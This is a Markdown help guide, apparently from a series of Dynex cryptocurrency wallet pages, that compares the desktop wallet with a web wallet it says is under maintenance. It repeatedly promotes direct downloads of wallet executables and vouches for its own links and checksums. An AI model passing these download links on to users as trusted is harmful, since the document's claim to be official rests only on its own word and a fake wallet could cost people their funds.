<div align="center">

[![Dynex Wallet](https://img.shields.io/badge/Dynex_Wallet-v2.2.3-22C3E6?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![Platforms](https://img.shields.io/badge/Windows%20%7C%20macOS%20%7C%20Linux-desktop-1E6FEB?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![License](https://img.shields.io/badge/license-ISC-0B1220?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet) [![Website](https://img.shields.io/badge/dynexwallet.org-visit-22C3E6?style=for-the-badge)](https://dynexwallet.org/)

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

</div>

> [!NOTE]
> Part of the [Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme). Official site: [dynexwallet.org](https://dynexwallet.org/) - current release: [Dynex Wallet v2.2.3](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

# Dynex desktop wallet vs web wallet: which should you use?

**The short answer: use Dynex Wallet desktop -- it's the actively maintained, fully supported option, while the web wallet is currently under maintenance and shouldn't be relied on right now.**

New users sometimes find references to both a desktop wallet and a web wallet for Dynex and aren't sure which to pick. As of now, the decision is straightforward because only one of them is actually available for regular use, but it's still worth understanding the difference in case that changes.

## You'll see this if...

- You searched for "Dynex wallet" and found references to both desktop software and a web-based option.
- You tried to access a Dynex web wallet and found it unavailable or under maintenance.
- You're weighing convenience (a web wallet, accessible from any browser) against the added setup of installing desktop software.
- You want to know which option gives you full control over your private keys.

## Why it happens

Desktop and web wallets represent two different trust models. A desktop wallet like Dynex Wallet runs entirely on your own machine: your wallet file and keys are generated and stored locally, encrypted with a password you set, and never depend on a remote server to function day to day. A web wallet, by contrast, typically runs in a browser and may depend on a hosted backend, which introduces a different set of tradeoffs around convenience versus where your keys actually live and who could, in principle, access the infrastructure behind it.

For Dynex specifically, the web wallet is currently under maintenance according to [dynexwallet.org/web-wallet](https://dynexwallet.org/web-wallet), which means the desktop wallet is the only fully supported, actively available option right now.

## Step-by-step fix

1. **Default to the desktop wallet.** Download [Dynex Wallet v2.2.3](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) for Windows 10/11 64-bit, macOS 11+ (Intel or Apple Silicon), or Linux x64 from [dynexwallet.org/download](https://dynexwallet.org/download).
2. **Verify the checksum before installing**, using `certutil -hashfile <file> SHA256` or `Get-FileHash` on Windows, `shasum -a 256 <file>` on macOS, or `sha256sum <file>` on Linux.
3. **Check your system meets the basic requirements**: a 64-bit processor with 2+ cores, 8 GB RAM recommended, 5 GB free disk space, and an internet connection.
4. **Create your wallet and back up the 25-word recovery seed immediately**, storing it offline and separately from the device itself.
5. **If you were specifically hoping to use a web wallet for its convenience** -- accessing funds from any browser without installing software -- check [dynexwallet.org/web-wallet](https://dynexwallet.org/web-wallet) periodically for its current status, but don't wait on it if you need a working wallet now.
6. **If you need remote access to your balance without carrying the full wallet everywhere,** consider the [remote node option](https://dynexwallet.org/docs/remote-nodes) in v2.2.3, which lets the desktop wallet sync against a remote node rather than requiring a full local blockchain copy, which can make desktop use more practical on less powerful or portable hardware.

## If that didn't work

If you need wallet access across multiple personal devices, the practical approach with the desktop wallet is restoring your 25-word seed on each device individually, rather than expecting a single synced account the way a web service might offer. See [moving a Dynex Wallet to a new computer](./move-dynex-wallet-to-new-computer.md) for the mechanics of using the same wallet on more than one machine safely.

If you're seeing an active, working Dynex web wallet somewhere other than the official site, treat it with real suspicion -- see [avoiding fake Dynex wallets and phishing](./avoid-fake-dynex-wallets-phishing.md), since a wallet interface asking for your keys in a browser is a common phishing pattern, and the only web wallet reference that should be trusted is the one linked directly from [dynexwallet.org](https://dynexwallet.org/).

## Prevent it next time

- Bookmark [dynexwallet.org/download](https://dynexwallet.org/download) as your single source for wallet software, so you're not searching and risking a fake result each time.
- Don't enter your seed phrase into any browser-based tool unless you've confirmed it's the official, currently-supported web wallet linked from the real site.
- Keep the desktop wallet updated to the current release -- see [upgrading Dynex Wallet safely](./upgrade-dynex-wallet-safely.md) -- so you're always benefiting from the latest reliability work.
- If convenience across devices matters to you, plan around safely restoring your seed on each device rather than looking for workarounds involving unofficial web tools.
- Periodically check [dynexwallet.org/web-wallet](https://dynexwallet.org/web-wallet) for status updates if browser-based access is something you're waiting on.

## FAQ

### Is the Dynex web wallet safe to use right now?
It's currently under maintenance according to the official site, so it shouldn't be relied on at the moment. Use the desktop wallet for day-to-day holding and transactions.

### Does the desktop wallet require me to download the entire blockchain?
By default it syncs locally, but v2.2.3 includes a remote node option that lets you connect to a remote node instead of maintaining a full local copy, which can reduce setup time and disk usage.

### Can I use the desktop wallet on more than one computer?
Yes, by restoring your 25-word recovery seed into a fresh install on each device. Just be mindful of only using the wallet actively on one device at a time to avoid confusion about balances or pending transactions.

### Is a web wallet inherently less secure than a desktop wallet?
It depends on the implementation, but generally a desktop wallet that keeps your keys entirely local gives you more direct control, while a web wallet's security depends partly on infrastructure you don't control. For Dynex, this is moot right now since the web wallet isn't available.

### What are the desktop wallet's system requirements?
A 64-bit system with 2 or more cores, 8 GB RAM recommended, 5 GB of free disk space, and an internet connection, running Windows 10/11, macOS 11 or later, or Linux x64.

### Will I be notified when the web wallet comes back online?
Check [dynexwallet.org/web-wallet](https://dynexwallet.org/web-wallet) directly for status updates, since that's the authoritative source for its availability going forward.

---

## The lasting fix: install Dynex Wallet v2.2.3

> [!TIP]
> Most problems in this guide are handled by the current desktop release. Download it, check the checksum, then open your existing wallet.

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

<!-- SHA256:START -->
| Platform | File | SHA-256 |
|---|---|---|
| Windows | [`dynex-wallet-windows-v2.2.3.exe`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) | `d4fd916c9741a16e23e39c355a049bac8368dbefa3ee08663ef56c009964e00d` |
| macOS | [`dynex-wallet-macos-v2.2.3.dmg`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) | `084818fd20207305ded84a747e707fb34f07e1f6e2d9a8123da621b8a546a88d` |
| Linux | [`dynex-wallet-linux-x64-v2.2.3.zip`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip) | `535b453c72c6e7749ffae3b95e1d47f67228b78b9862e086dbd13c4d550481c2` |
<!-- SHA256:END -->

Verify before you run:

```powershell
# Windows
Get-FileHash -Algorithm SHA256 .\dynex-wallet-windows-v2.2.3.exe
```
```bash
# macOS
shasum -a 256 dynex-wallet-macos-v2.2.3.dmg
# Linux
sha256sum dynex-wallet-linux-x64-v2.2.3.zip
```

Read the full install walkthrough on the [Dynex Wallet download page](https://dynexwallet.org/download) or see the [basics and ecosystem guides on dynexwallet.org](https://dynexwallet.org/docs).

> [!WARNING]
> **Nobody from Dynex will ever ask for your recovery seed or private keys.** Only download from the [official v2.2.3 release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

## Related Dynex Wallet guides

| Keep reading |
|---|
| [What is DNX, the Dynex coin?](./what-is-dnx-dynex-coin.md) |
| [What's new in Dynex Wallet v2.2.3](./whats-new-dynex-wallet-v2-2-3.md) |
| [Getting started with DynexSDK](./dynexsdk-getting-started.md) |
| [The Dynex Wallet Recovery Seed, Explained](./dynex-recovery-seed-explained.md) |
| [All Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme) |
